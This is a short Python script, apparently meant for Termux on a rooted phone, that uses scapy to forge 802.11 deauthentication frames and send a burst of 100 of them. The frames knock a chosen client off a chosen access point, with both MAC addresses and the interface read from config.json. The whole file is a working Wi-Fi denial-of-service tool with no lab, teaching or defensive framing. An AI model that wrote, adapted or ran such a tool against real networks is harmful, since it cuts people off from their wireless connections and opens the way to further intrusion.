import json
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
import os

# Load configuration from config.json
def load_config():
    with open("config.json", "r") as file:
        return json.load(file)

# Deauthentication function
def deauth(target_mac, ap_mac, interface):
    packet = RadioTap() / Dot11(type=0, subtype=12, addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
    sendp(packet, iface=interface, count=100, inter=0.1, verbose=True)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("⚠ This script requires root access! Run with tsu (Termux-SuperUser).")
        exit()

    config = load_config()
    deauth(config["target_mac"], config["ap_mac"], config["interface"])